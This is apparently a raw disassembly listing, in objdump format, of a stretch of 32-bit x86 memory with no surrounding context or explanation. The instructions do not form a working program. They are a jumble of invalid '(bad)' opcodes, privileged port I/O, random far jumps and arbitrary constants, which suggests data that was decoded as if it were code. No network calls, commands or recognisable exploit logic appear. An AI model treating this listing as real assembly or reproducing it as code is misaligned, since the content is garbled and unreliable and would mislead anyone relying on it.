  409288:	sbb    BYTE PTR [edi-0x66],ch
  40928b:	popf   
  40928c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40928d:	jle    0x409274
  40928f:	mov    ebx,0xb917e2f5
  409294:	or     al,0xaa
  409296:	repz (bad) 
  409298:	pop    ss
  409299:	xor    al,0x72
  40929b:	sbb    eax,DWORD PTR [ebx-0x43a2c7e4]
  4092a1:	jb     0x409292
  4092a3:	dec    esi
  4092a4:	jns    0x4092b4
  4092a6:	(bad)  
  4092a8:	dec    esi
  4092a9:	test   BYTE PTR [edi],bl
  4092ab:	test   DWORD PTR [edi-0x531a4788],0xbf78ce61
  4092b5:	adc    bl,cl
  4092b7:	add    BYTE PTR [ebx+0x17db33c1],al
  4092bd:	xor    DWORD PTR [esi+0x7d167559],edi
  4092c3:	mov    BYTE PTR [eax-0x7d],dl
  4092c6:	push   eax
  4092c7:	dec    esp
  4092c8:	xchg   ebp,eax
  4092c9:	js     0x409252
  4092cb:	dec    edx
  4092cc:	cmp    al,0xac
  4092ce:	outs   dx,DWORD PTR ds:[esi]
  4092cf:	into   
  4092d0:	nop
  4092d1:	outs   dx,BYTE PTR ds:[esi]
  4092d2:	push   ss
  4092d3:	inc    ecx
  4092d4:	test   eax,0xc85afb17
  4092d9:	push   0x2e
  4092db:	mov    ?,WORD PTR [eax]
  4092dd:	int    0xe9
  4092df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092e0:	repz fsub st(6),st
  4092e3:	or     DWORD PTR ds:0xdb868d72,0x48d2a394
  4092ed:	test   BYTE PTR [esi+ebp*4-0x44dc09c4],0x60
  4092f5:	sbb    BYTE PTR [edi+0x6258b3a1],al
  4092fb:	jp     0x409316
  4092fd:	lock mov eax,ds:0x11b58b13
  409303:	sub    BYTE PTR [eax+0x6],bh
  409306:	imul   BYTE PTR [edx]
  409308:	lock jle 0x4092b3
  40930b:	pushf  
  40930c:	out    0x64,al
  40930e:	pop    esp
  409310:	xchg   ebp,eax
  409311:	add    dl,dl
  409313:	pop    esi
  409314:	fiadd  DWORD PTR [esi-0x73]
  409317:	outs   dx,BYTE PTR ds:[esi]
  409318:	xlat   BYTE PTR ds:[ebx]
  409319:	xchg   ebx,eax
  40931a:	jae    0x409340
  40931c:	int    0xf8
  40931e:	push   ds
  40931f:	mov    eax,0x9ee3f745
  409324:	pop    ds
  409325:	out    0x25,al
  409327:	xor    ecx,DWORD PTR [ecx+0x29ec0184]
  40932d:	mov    dh,0x40
  40932f:	pop    esi
  409330:	xlat   BYTE PTR ds:[ebx]
  409331:	popa   
  409332:	adc    cl,bl
  409334:	adc    DWORD PTR [ecx+0x44],ebx
  409337:	jmp    0x83af1441
  40933c:	xor    BYTE PTR [ebp-0x4],bh
  40933f:	test   DWORD PTR [ecx-0x50],eax
  409342:	inc    ebx
  409343:	sbb    DWORD PTR [ebx+0x37],ebp
  409346:	and    dl,BYTE PTR [ecx+0x70]
  409349:	jl     0x4092e8
  40934b:	dec    ebp
  40934c:	sub    DWORD PTR [ebp+0x2f],edx
  40934f:	mov    dh,0x1e
  409351:	scas   eax,DWORD PTR es:[edi]
  409352:	ins    DWORD PTR es:[edi],dx
  409353:	mov    ah,0xef
  409355:	xchg   edx,eax
  409356:	scas   eax,DWORD PTR es:[edi]
  409357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409358:	mov    bl,0x6
  40935a:	jmp    0x40930d
  40935c:	mov    al,0x67
  40935e:	idiv   DWORD PTR [eax+0x54f6b4f4]
  409364:	cmp    eax,0xd179ba1
  409369:	mov    al,ds:0xab690ab1
  40936e:	sub    DWORD PTR [esi+eiz*2],ebx
  409371:	jns    0x4093e6
  409373:	loop   0x40938a
  409375:	sub    ebx,DWORD PTR [esp+esi*8-0x68087ca6]
  40937c:	repz in eax,0xa7
  40937f:	(bad)
  409382:	xlat   BYTE PTR ds:[ebx]
  409383:	cmp    eax,0xbfd08b7b
  409388:	(bad)  [edx]
  40938a:	xor    al,0x5c
  40938c:	jae    0x40933a
  40938e:	dec    edi
  40938f:	cmp    eax,0x30b7b605
  409394:	pop    es
  409395:	out    0x48,eax
  409397:	mov    eax,0x9dcf61ff
  40939c:	aaa    
  40939d:	dec    eax
  40939e:	inc    edx
  40939f:	push   ebx
  4093a0:	mov    bl,0x30
  4093a2:	mov    edi,0xd0c604cc
  4093a7:	cmp    al,0xd
  4093a9:	dec    esp
  4093aa:	enter  0x282a,0x2f
  4093ae:	sub    al,al
  4093b0:	clc    
  4093b1:	mov    ss,WORD PTR [eax+0x63]
  4093b4:	int3   
  4093b5:	dec    esp
  4093b6:	lods   al,BYTE PTR ds:[esi]
  4093b7:	cdq    
  4093b8:	sar    BYTE PTR [bx],0xe2
  4093bc:	jmp    0xae88:0xf23069e5
  4093c3:	pop    ecx
  4093c4:	call   0x29fe332d
  4093c9:	xchg   edx,eax
  4093ca:	scas   al,BYTE PTR es:[edi]
  4093cb:	nop
  4093cc:	jne    0x409367
  4093ce:	cmp    dh,BYTE PTR [eax-0x2110ffe2]
  4093d4:	cwde   
  4093d5:	call   0xb42:0x1aa94cc3
  4093dc:	mul    DWORD PTR [eax+0x1c]
  4093df:	addr16 adc edi,ebx
  4093e2:	sar    DWORD PTR [ebx],cl
  4093e4:	(bad)  
  4093e6:	sbb    al,0xce
  4093e8:	add    al,0x3f
  4093ea:	mov    dh,0x29
  4093ec:	outs   dx,DWORD PTR ds:[esi]
  4093ed:	call   0xd988:0x3764595d
  4093f4:	xchg   esi,eax
  4093f5:	pusha  
  4093f6:	add    al,BYTE PTR [esi]
  4093f8:	sub    BYTE PTR [edi-0x39a07726],0x72
  4093ff:	and    DWORD PTR [edx-0x46676a8b],esi
  409405:	enter  0xd398,0x8c
  409409:	and    eax,0xbd151c00
  40940e:	sub    al,0xa6
  409410:	jge    0x409436
  409412:	sar    BYTE PTR [ebx-0x1669046b],cl
  409418:	xchg   esi,eax
  409419:	jmp    0x409497
  40941b:	imul   edi,DWORD PTR [edi-0x47b0537c],0xaf1b5b2
  409425:	in     eax,0xbc
  409427:	add    edx,DWORD PTR ds:0x6f7a531f
  40942d:	sahf   
  40942e:	jge    0x4093e3
  409430:	int    0xf4
  409432:	sbb    al,0x8f
  409434:	and    bh,BYTE PTR [esi+0x71]
  409437:	mov    edi,DWORD PTR [ecx]
  409439:	xchg   edx,eax
  40943a:	jl     0x40947a
  40943c:	pop    DWORD PTR [edi]
  40943e:	sub    dh,BYTE PTR [edx+0x52]
  409441:	punpcklbw mm2,mm1
  409444:	cmp    bh,BYTE PTR [eax]
  409446:	repz retf 0x8a57
  40944a:	add    edx,ecx
  40944c:	call   0x3b6a57
  409451:	dec    edi
  409452:	neg    DWORD PTR [edi-0x6]
  409455:	in     eax,0x2f
  409457:	and    al,0xf5
  409459:	adc    esi,DWORD PTR [edx+edx*2]
  40945c:	mov    edi,0x749024b9
  409461:	sub    ebp,DWORD PTR [edx]
  409463:	sbb    ch,BYTE PTR [edx-0x45]
  409466:	dec    ebp
  409467:	ror    ax,0xf1
  40946b:	pop    ss
  40946c:	mov    edx,0xc7a9fd5
  409471:	sub    dh,bh
  409473:	in     eax,0xea
  409475:	shl    DWORD PTR [esi],1
  409477:	mov    ebx,0xad381fff
  40947c:	int3   
  40947d:	ds jge 0x4094e0
  409480:	jmp    0x4094b9
  409482:	mov    edx,0xcdc3e6a0
  409487:	mov    ebx,0x77abaaea
  40948c:	xchg   esi,eax
  40948d:	mov    ebp,0x84475978
  409492:	jbe    0x4094ff
  409494:	sub    al,0x14
  409496:	pop    ebx
  409497:	mov    esp,0xa4c0063f
  40949c:	ror    cl,0xb5
  40949f:	xchg   DWORD PTR [edi-0x56],esi
  4094a2:	in     al,0xe9
  4094a4:	mov    cs:0x658494bd,eax
  4094aa:	dec    ebp
  4094ab:	pushf  
  4094ac:	jecxz  0x4094f4
  4094ae:	aam    0x28
  4094b0:	cmp    ah,ah
  4094b2:	out    0xf3,al
  4094b4:	mov    ebp,0xf910b7e8
  4094b9:	jle    0x4094f9
  4094bb:	mov    eax,0x673295ca
  4094c0:	and    eax,0x15cc961f
  4094c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094c6:	int3   
  4094c7:	stos   DWORD PTR es:[edi],eax
  4094c8:	mov    WORD PTR [ebx],ss
  4094ca:	sti    
  4094cb:	mov    bl,0x51
  4094cd:	pop    ss
  4094ce:	jne    0x4094c3
  4094d0:	mov    eax,ds:0xe73b46fc
  4094d5:	and    al,0x88
  4094d7:	std    
  4094d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094d9:	push   0x75
  4094db:	leave  
  4094dc:	jns    0x40946c
  4094de:	jbe    0x40950a
  4094e0:	mov    ebx,0x2654fd4a
  4094e5:	and    al,BYTE PTR [ecx+edi*8-0xb30df1b]
  4094ec:	jae    0x4094f8
  4094ee:	scas   al,BYTE PTR es:[edi]
  4094ef:	in     eax,dx
  4094f0:	retf   
  4094f1:	mov    edx,0x3cc78ea1
  4094f6:	es (bad) 
  4094f8:	pop    ecx
  4094f9:	popf   
  4094fa:	dec    esp
  4094fb:	daa    
  4094fc:	mov    eax,ds:0x2b1a18ac
  409501:	stc    
  409502:	add    al,BYTE PTR [esi]
  409504:	jp     0x40957e
  409506:	int3   
  409507:	lahf   
  409508:	repz or DWORD PTR [esi],ebp
  40950b:	adc    eax,0x40492db5
  409510:	mov    ebx,DWORD PTR [edi]
  409512:	inc    edx
  409513:	push   ebx
  409514:	pop    ebx
  409515:	ror    BYTE PTR [edx+0x4fa22dc7],0x6e
  40951c:	mov    bh,0x25
  40951e:	cmp    ch,BYTE PTR [ecx+0x705a76f2]
  409524:	cmp    bl,BYTE PTR [ecx]
  409526:	mov    ebx,esp
  409528:	or     ah,BYTE PTR [esi-0xb9efe5d]
  40952e:	push   esi
  40952f:	and    dh,al
  409531:	(bad)
  409535:	xor    DWORD PTR [esi+0xb],ebp
  409538:	jns    0x409525
  40953a:	dec    eax
  40953b:	or     BYTE PTR [ebx+0x62],ch
  40953e:	or     al,0x34
  409540:	mov    edx,0x36af94d4
  409545:	adc    BYTE PTR [edi+0x24],0xa7
  409549:	enter  0xe103,0x6e
  40954d:	test   al,0x2d
  40954f:	mov    dl,al
  409551:	inc    edx
  409552:	repz mov eax,ds:0x51904342
  409558:	jmp    0xc27d:0xb14dab4f
  40955f:	ss jecxz 0x409515
  409562:	sar    BYTE PTR [esi-0x8622668],1
  409568:	clc    
  409569:	jl     0x40958d
  40956b:	test   dl,bh
  40956d:	adc    dh,BYTE PTR [edx+0x4c9e28e8]
  409573:	jmp    0x409531
  409575:	dec    esp
  409576:	xor    eax,0xcc78e3a9
  40957b:	mov    edx,ebx
  40957d:	xchg   ebx,eax
  40957e:	jb     0x40951e
  409580:	xor    eax,0xbfb21d8b
  409585:	adc    BYTE PTR [eax+0x662f3bae],0x60
  40958c:	push   ss
  40958d:	sub    BYTE PTR [ecx-0x186f4dab],0x18
  409594:	pop    ebp
  409595:	adc    al,0x67
  409597:	test   BYTE PTR [ebx-0x48f72db6],0x94
  40959e:	dec    ebp
  40959f:	xlat   BYTE PTR ds:[ebx]
  4095a0:	xchg   BYTE PTR [edi],al
  4095a2:	add    eax,0xffb41d2e
  4095a7:	into   
  4095a8:	xor    ebx,DWORD PTR [edi+0x56]
  4095ab:	hlt    
  4095ac:	jmp    0x5565412d
  4095b1:	mov    ebp,0x2973a353
  4095b6:	mov    al,ds:0x851dd0b6
  4095bb:	retf   
  4095bc:	ror    edx,1
  4095be:	adc    eax,0xc636325a
  4095c3:	shr    bl,0xa4
  4095c6:	sub    al,0xad
  4095c8:	xchg   edi,eax
  4095c9:	jle    0x4095f5
  4095cb:	and    al,0x3c
  4095cd:	mov    ch,0xd9
  4095cf:	inc    ebx
  4095d0:	stc    
  4095d1:	retf   0xf7cd
  4095d4:	mov    ah,0x1e
  4095d6:	jle    0x4095cd
  4095d8:	(bad)  
  4095d9:	clc    
  4095da:	ret    
  4095db:	xchg   ebp,eax
  4095dc:	scas   al,BYTE PTR es:[edi]
  4095dd:	cmp    DWORD PTR [eax+eiz*4-0x5a77581a],ebp
  4095e4:	retf   
  4095e5:	pop    ss
  4095e6:	inc    ebp
  4095e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095e8:	sub    dh,BYTE PTR [ebp-0x464f3dec]
  4095ee:	dec    eax
  4095ef:	shr    DWORD PTR [edi-0x3e],1
  4095f2:	inc    edx
  4095f3:	pop    sp
  4095f5:	mov    DWORD PTR [edi-0x77db72af],ebp
  4095fb:	arpl   si,sp
  4095fd:	leave  
  4095fe:	mov    al,ds:0x5423bb8e
  409603:	sub    esi,DWORD PTR [edx-0x539ccbac]
  409609:	popf   
  40960a:	loop   0x4095ce
  40960c:	mov    esp,0x7cd86766
  409611:	mov    ds:0x9d81eb3f,eax
  409616:	jg     0x4095e3
  409618:	adc    cl,BYTE PTR [edi+0x1]
  40961b:	fwait
  40961c:	pop    eax
  40961d:	dec    eax
  40961e:	xchg   edi,eax
  40961f:	add    eax,0xafc5e365
  409624:	lahf   
  409625:	sbb    eax,0x9d2815ab
  40962a:	cld    
  40962b:	fsubr  DWORD PTR [ebp+0x5c]
  40962e:	rol    cl,1
  409630:	jge    0x4095d4
  409632:	repnz enter 0xdb53,0x41
  409637:	xor    ch,BYTE PTR [eax+0x3e2b5c0]
  40963d:	retf   0x1a6a
  409640:	jae    0x40968f
  409642:	add    eax,0x21963f67
  409647:	xchg   esp,eax
  409648:	cdq    
  409649:	mov    esp,0xcdb91500
  40964e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40964f:	cmp    DWORD PTR ds:0xb9e93510,esi
  409655:	into   
  409656:	pop    ss
  409657:	xchg   ebx,eax
  409658:	es pop edi
  40965a:	test   BYTE PTR [ebx+eax*8],dl
  40965d:	mov    esp,0xfc71ee43
  409662:	add    bh,BYTE PTR [ebx+0x7c85087c]
  409668:	or     ecx,edx
  40966a:	data16 adc al,0x0
  40966d:	xor    ebx,ecx
  40966f:	popf   
  409670:	bound  eax,QWORD PTR [ecx+0x6be775b1]
  409676:	xor    eax,0x4570c929
  40967b:	fnstenv [eax-0x68b91aa5]
  409681:	jp     0x409667
  409683:	(bad)
  409686:	sbb    esi,ecx
  409688:	sbb    eax,0x4f16a9a2
  40968d:	dec    edx
  40968e:	xor    BYTE PTR [eax-0x16ad050b],ch
  409694:	daa    
  409695:	fisttp WORD PTR [esi]
  409697:	int    0x7d
  409699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40969a:	(bad)  
  40969b:	mov    ch,0x4a
  40969d:	retf   0xf8bb
  4096a0:	adc    esi,esp
  4096a2:	mov    edi,0xbb71d068
  4096a7:	push   esi
  4096a8:	cdq    
  4096a9:	and    BYTE PTR [ecx],ch
  4096ab:	(bad)  
  4096ac:	jmp    0xcb4:0x602dd37d
  4096b3:	add    eax,0x259e973a
  4096b8:	mov    esi,?
  4096ba:	es push cs
  4096bc:	jecxz  0x40970d
  4096be:	mov    edx,0x1d7d977b
  4096c3:	xor    ch,BYTE PTR [esi+0x6c64ddd8]
  4096c9:	test   al,0xa0
  4096cb:	pop    es
  4096cc:	add    eax,0x5cf43dd8
  4096d1:	cmp    DWORD PTR [esi],0xbcd85025
  4096d7:	out    0xd8,eax
  4096d9:	mov    dh,0x85
  4096db:	cli    
  4096dc:	cmp    ebp,edx
  4096de:	arpl   WORD PTR [edx+0x4d],bp
  4096e1:	mov    ds:0xa67b3e4c,eax
  4096e6:	and    BYTE PTR [esi+0x19fc013],dh
  4096ec:	lods   al,BYTE PTR ds:[esi]
  4096ed:	mov    ch,0x1a
  4096ef:	add    dl,dl
  4096f1:	(bad)  
  4096f2:	(bad)  
  4096f3:	test   BYTE PTR [edx],0x6b
  4096f6:	stos   DWORD PTR es:[edi],eax
  4096f7:	loop   0x409700
  4096f9:	sbb    cl,BYTE PTR [eax+esi*4-0x14603c4e]
  409700:	fwait
  409701:	popf   
  409702:	and    eax,0x2b48ac65
  409707:	gs mov cl,0xa3
  40970a:	mov    esp,0x33fef1d2
  40970f:	fstp   TBYTE PTR [edi]
  409711:	pop    ds
  409712:	jmp    0x409698
  409714:	mov    ds:0x247e8d65,eax
  409719:	ret    
  40971a:	adc    BYTE PTR [bx+si+0x1c01],dh
  40971f:	cld    
  409720:	adc    DWORD PTR [ecx],eax
  409722:	adc    eax,0xae303683
  409727:	jb     0x4096f6
  409729:	int3   
  40972a:	xor    al,0xba
  40972c:	jg     0x4096b9
  40972e:	call   0x7b76:0x1b5bf267
  409735:	dec    edi
  409736:	inc    esp
  409737:	mov    bl,0x63
  409739:	pop    ss
  40973a:	add    BYTE PTR [esi],ch
  40973c:	rcr    ebp,0xde
  40973f:	fwait
  409740:	mov    esp,0x7e9eca7a
  409745:	fst    DWORD PTR [esi-0x33986b03]
  40974b:	pop    ebx
  40974c:	aad    0xdf
  40974e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40974f:	xlat   BYTE PTR ds:[ebx]
  409750:	or     esi,edx
  409752:	loop   0x4097cd
  409754:	inc    esp
  409755:	add    BYTE PTR [eax+0x36],dl
  409758:	add    eax,0x1e729441
  40975d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40975e:	in     eax,0xad
  409760:	aaa    
  409761:	fs inc esi
  409763:	jbe    0x40970d
  409765:	in     eax,0x5b
  409767:	cmp    BYTE PTR [ebx+edx*2+0x6f029237],ch
  40976e:	mov    ?,WORD PTR [ecx+ebp*8+0xe]
  409772:	iret   
  409773:	mov    fs,WORD PTR cs:[esi]
  409776:	test   DWORD PTR [edi-0x3c195ac5],0xd2a31d59
  409780:	and    al,BYTE PTR [eax-0x776e5171]
  409786:	loopne 0x4097a0
  409788:	in     al,0x38
  40978a:	popf   
  40978b:	fstp   TBYTE PTR [edx-0x3e5f67d0]
  409791:	ss in  al,dx
  409793:	push   esi
  409794:	in     al,0x54
  409796:	mov    al,ds:0x86b22ba0
  40979b:	repnz (bad) 
  40979d:	sbb    bh,BYTE PTR [esi-0x2]
  4097a0:	rol    DWORD PTR [esi+0x766ef98b],0x1e
  4097a7:	shr    DWORD PTR [edx-0x3d526d1d],0x8b
  4097ae:	sub    bl,BYTE PTR [ebp-0x5a9bd518]
  4097b4:	or     DWORD PTR [edx],edx
  4097b6:	popf   
  4097b7:	cmp    BYTE PTR [eax],cl
  4097b9:	and    dh,BYTE PTR [edx-0x3ff3a57]
  4097bf:	imul   esp,DWORD PTR [esi+0x1a],0x56
  4097c3:	test   eax,0x46060f22
  4097c8:	mov    edx,0x844429db
  4097cd:	retf   0x509a
  4097d0:	cmp    edi,DWORD PTR [edi]
  4097d2:	hlt    
  4097d3:	aaa    
  4097d4:	cwde   
  4097d5:	aas    
  4097d6:	imul   esp,DWORD PTR [edi+0x0],0x46
  4097da:	push   ecx
  4097db:	lods   eax,DWORD PTR ds:[esi]
  4097dc:	(bad)  
  4097dd:	imul   ebx,DWORD PTR [edi+0x34],0x11
  4097e1:	adc    bl,ch
  4097e3:	sbb    ebx,DWORD PTR [esi-0xca8e00c]
  4097e9:	addr16 std 
  4097eb:	aas    
  4097ec:	mov    eax,ds:0xd5627b9b
  4097f1:	iret   
  4097f2:	inc    ecx
  4097f3:	jg     0x40982e
  4097f5:	pushf  
  4097f6:	push   edx
  4097f7:	and    BYTE PTR [edi+0x1d],bl
  4097fa:	add    eax,0xe032276
  4097ff:	imul   DWORD PTR [edx+0x21c08025]
  409805:	inc    esp
  409806:	rol    BYTE PTR [edx+0x6933d178],cl
  40980c:	inc    eax
  40980d:	push   0xffffffb7
  40980f:	ins    DWORD PTR es:[edi],dx
  409810:	xchg   esp,eax
  409811:	jecxz  0x40988d
  409813:	adc    ebx,ebp
  409815:	inc    esp
  409816:	loope  0x4097a7
  409818:	call   0x3aa2:0xc71c9abd
  40981f:	sub    dh,BYTE PTR [edx]
  409821:	shl    ecx,1
  409823:	add    eax,eax
  409825:	jp     0x409840
  409827:	jl     0x409832
  409829:	pop    es
  40982a:	fucomi st,st(3)
  40982c:	(bad)  
  40982d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40982e:	adc    BYTE PTR [edx],ah
  409830:	shl    edi,1
  409832:	mov    esp,0x92546580
  409837:	aaa    
  409838:	scas   al,BYTE PTR es:[edi]
  409839:	popf   
  40983a:	lods   eax,DWORD PTR ds:[esi]
  40983b:	pusha  
  40983c:	repnz inc esi
  40983e:	mov    esi,0x425df787
  409843:	neg    BYTE PTR [ebp+0x37]
  409846:	pop    esp
  409847:	aas    
  409848:	pop    ss
  409849:	lds    esp,FWORD PTR [ebx-0x6a595432]
  40984f:	push   ds
  409850:	mov    al,0xf4
  409852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409853:	lods   eax,DWORD PTR ds:[esi]
  409854:	out    0xb,eax
  409856:	mov    cl,0x5f
  409858:	fsubp  st(2),st
  40985a:	mov    esi,eax
  40985c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40985d:	jge    0x4098a5
  40985f:	dec    esi
  409860:	push   ebx
  409861:	pop    edx
  409862:	jg     0x40983a
  409864:	scas   eax,DWORD PTR es:[edi]
  409865:	fwait
  409866:	sub    eax,0xaebbea5c
  40986b:	sbb    bh,BYTE PTR [esi]
  40986d:	in     eax,dx
  40986e:	arpl   WORD PTR [eax+eax*2],bx
  409871:	ja     0x409873
  409873:	sar    BYTE PTR [ecx+ecx*8],cl
  409876:	aaa    
  409877:	retf   
  409878:	jbe    0x409853
  40987a:	push   ss
  40987b:	mov    al,ds:0xa56f21dd
  409880:	stc    
  409881:	test   DWORD PTR [esi],eax
  409883:	and    ah,BYTE PTR [edx+0x633e3a3b]
  409889:	fimul  WORD PTR [eax+0x3c]
  40988c:	jne    0x40985f
  40988e:	jbe    0x409870
  409890:	inc    edx
  409891:	ret    
  409892:	jecxz  0x4098a3
  409894:	popa   
  409895:	arpl   WORD PTR [edi],cx
  409897:	push   0xffffffaf
  409899:	adc    al,0x4c
  40989b:	pop    ss
  40989c:	push   0x73
  40989e:	fsubr  DWORD PTR [edx]
  4098a0:	call   0xc76f:0xfaa759ec
  4098a7:	stos   DWORD PTR es:[edi],eax
  4098a8:	xchg   ecx,eax
  4098a9:	test   ch,cl
  4098ab:	sub    eax,0xe3ed6c98
  4098b0:	test   ebp,0x6215f8be
  4098b6:	jmp    0xa79419f5
  4098bb:	or     DWORD PTR [ebp+esi*4-0x5c],esi
  4098bf:	mov    bl,0x8e
  4098c1:	sbb    ebx,DWORD PTR ss:[eax+0x1b]
  4098c5:	mov    ebp,0x1cda7baa
  4098ca:	and    al,0x24
  4098cc:	cmp    DWORD PTR [ebp+0x6d],esp
  4098cf:	adc    eax,0x35bb9d74
  4098d4:	out    0x27,al
  4098d6:	loop   0x40987a
  4098d8:	xchg   bh,dh
  4098da:	pop    ds
  4098db:	push   eax
  4098dc:	addr16 (bad) 
  4098de:	jb     0x4098e5
  4098e0:	push   eax
  4098e2:	lea    eax,[eax+0x76]
  4098e5:	sbb    ch,BYTE PTR [ebx+0x5b778f93]
  4098eb:	nop
  4098ec:	sbb    DWORD PTR [eax+eiz*1+0x59],0x9826ed9a
  4098f4:	nop
  4098f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098f6:	sub    esi,ecx
  4098f8:	outs   dx,BYTE PTR ds:[esi]
  4098f9:	push   0x1c90a5d1
  4098fe:	pop    esp
  4098ff:	rol    BYTE PTR [edi],0x16
  409902:	scas   eax,DWORD PTR es:[edi]
  409903:	pop    ebp
  409904:	mov    ebp,0xe9b0a4ab
  409909:	xor    DWORD PTR [esp+ebp*1-0x3c7dc4f6],ebx
  409910:	ja     0x40996f
  409912:	scas   eax,DWORD PTR es:[edi]
  409913:	mov    cl,0x85
  409915:	es and al,0x81
  409918:	pushf  
  409919:	jl     0x409980
  40991b:	or     al,0xa5
  40991d:	push   edi
  40991e:	jmp    0x20bd6dbb
  409923:	add    eax,0x1454e933
  409928:	clc    
  409929:	fstp   DWORD PTR ds:0xd07d7ccd
  40992f:	ss aad 0x5c
  409932:	add    BYTE PTR [ebx-0x3258db65],dl
  409938:	jnp    0x4098e2
  40993a:	lea    ecx,[ebx-0x17b8d894]
  409940:	imul   ebx,DWORD PTR [edi],0x2adc58b9
  409946:	test   DWORD PTR [edi],esp
  409948:	int    0xe
  40994a:	push   esp
  40994b:	mov    edi,DWORD PTR [edx-0x29]
  40994e:	stos   DWORD PTR es:[edi],eax
  40994f:	mov    edi,0xfe1843a9
  409954:	push   esp
  409955:	xor    BYTE PTR [esi],0x5f
  409958:	or     al,0x7e
  40995a:	lds    esp,FWORD PTR [ecx]
  40995c:	sub    eax,0xffb79bc1
  409961:	add    eax,0x5cc92ccc
  409966:	fdiv   st(6),st
  409968:	fbstp  TBYTE PTR ds:0x55c0d1c7
  40996e:	sbb    al,0xda
  409970:	out    dx,al
  409971:	and    BYTE PTR [ebp-0x35624a64],dl
  409977:	test   al,0xe7
  409979:	(bad)  
  40997b:	jnp    0x40998e
  40997d:	pop    edi
  40997e:	hlt    
  40997f:	or     BYTE PTR [edi-0x4ef1af9e],bh
  409985:	cli    
  409986:	mov    ch,0xf
  409988:	les    ebx,FWORD PTR ds:0xc0a65c7d
  40998e:	sbb    DWORD PTR [eax],edx
  409990:	inc    edi
  409991:	or     DWORD PTR [eax+0x744946f6],esi
  409997:	adc    bl,bl
  409999:	(bad)  
  40999a:	and    al,0x80
  40999c:	hlt    
  40999d:	inc    edx
  40999e:	mov    eax,ds:0xfb14ff3a
  4099a3:	sub    eax,0x47e77ebd
  4099a8:	and    bl,BYTE PTR [ebp+0x44f02393]
  4099ae:	repnz fs int3 
  4099b1:	pop    esp
  4099b2:	imul   esi,edi,0xffffffef
  4099b5:	popa   
  4099b6:	scas   eax,DWORD PTR es:[edi]
  4099b7:	mov    BYTE PTR [edx+eax*1+0x7b],bl
  4099bb:	in     al,0x48
  4099bd:	xor    DWORD PTR [ecx+eiz*2-0x4b3e4a87],eax
  4099c4:	pop    esi
  4099c5:	ret    0xfa76
  4099c8:	sahf   
  4099c9:	mov    ds:0x53773b90,al
  4099ce:	enter  0x359a,0x0
  4099d2:	add    BYTE PTR [ebp+0x58eed71f],ah
  4099d8:	ja     0x409a11
  4099da:	adc    BYTE PTR [edi+0x14],0xc
  4099de:	pop    esi
  4099df:	xor    ch,ch
  4099e1:	push   ss
  4099e2:	mov    ecx,0xad952f48
  4099e7:	in     al,dx
  4099e8:	ffree  st(1)
  4099ea:	sbb    eax,0x21a7c17d
  4099ef:	mov    dh,0x8c
  4099f1:	mov    DWORD PTR [edx+0x41],ebp
  4099f4:	inc    esp
  4099f5:	mov    al,0x45
  4099f7:	pop    edx
  4099f8:	jo     0x40997b
  4099fa:	ins    BYTE PTR es:[edi],dx
  4099fb:	lea    ecx,[eax+0x27]
  4099fe:	push   ss
  4099ff:	imul   BYTE PTR [eax+0x16]
  409a02:	sbb    BYTE PTR [ebp+0x40375503],bh
  409a08:	push   edi
  409a09:	mov    ds:0xecac972d,al
  409a0e:	push   es
  409a0f:	pusha  
  409a10:	cld    
  409a11:	add    al,BYTE PTR [edx+0x7a0f628c]
  409a17:	mov    edi,0x75484f41
  409a1c:	mov    eax,ds:0x59fe5516
  409a21:	cld    
  409a22:	add    dl,bl
  409a24:	jge    0x409a58
  409a26:	(bad)  
  409a27:	jmp    0x6b4:0xad7adae6
  409a2e:	xor    BYTE PTR [edi+edx*4+0x27],al
  409a32:	cmp    dh,BYTE PTR [ecx+0x5c88704d]
  409a38:	jg     0x409a82
  409a3a:	fwait
  409a3b:	mov    ah,0x96
  409a3d:	rcl    BYTE PTR ds:0x376fa7f,cl
  409a43:	fbld   TBYTE PTR [esi+eax*2+0x45]
  409a47:	(bad)  
  409a48:	mov    esi,0x83665013
  409a4d:	add    al,0x98
  409a4f:	mov    DWORD PTR [edx],edi
  409a51:	scas   al,BYTE PTR es:[edi]
  409a52:	cmp    al,bh
  409a54:	inc    edx
  409a55:	fsub   DWORD PTR [ecx]
  409a57:	ss mov esi,0x67350806
  409a5d:	shl    BYTE PTR ss:[eax-0x61f74d82],0xd1
  409a65:	les    edx,FWORD PTR [ebx+0x34]
  409a68:	sbb    BYTE PTR [edi-0x621fb5b4],ch
  409a6e:	iret   
  409a6f:	out    dx,eax
  409a70:	and    cl,BYTE PTR [esi]
  409a72:	lea    ebx,[ecx+0x56]
  409a75:	call   FWORD PTR [edx+eax*1+0x7067eed3]
  409a7c:	xchg   edi,eax
  409a7d:	pop    ss
  409a7e:	(bad)  
  409a7f:	ins    BYTE PTR es:[edi],dx
  409a80:	cmp    ah,BYTE PTR [esi+0x51]
  409a83:	nop
  409a84:	popa   
  409a85:	pushf  
  409a86:	es mov dh,cl
  409a89:	hlt    
  409a8a:	arpl   cx,si
  409a8c:	mov    al,0xf5
  409a8e:	adc    esp,DWORD PTR [edi+0x33]
  409a91:	and    BYTE PTR [edi+0x2a],dh
  409a94:	in     al,0x9b
  409a96:	mov    bl,0x4a
  409a98:	das    
  409a99:	adc    eax,ebx
  409a9b:	jp     0x409a23
  409a9d:	int    0x88
  409a9f:	(bad)  
  409aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aa1:	jne    0x409a7b
  409aa3:	mov    BYTE PTR [eax-0x5f],cl
  409aa6:	xor    BYTE PTR [edx],bh
  409aa8:	lock push eax
  409aaa:	pop    ds
  409aab:	mov    al,0x19
  409aad:	push   esi
  409aae:	or     DWORD PTR [edi+0x3dacf647],0x2f
  409ab5:	fnstcw WORD PTR [edx-0x62adbeba]
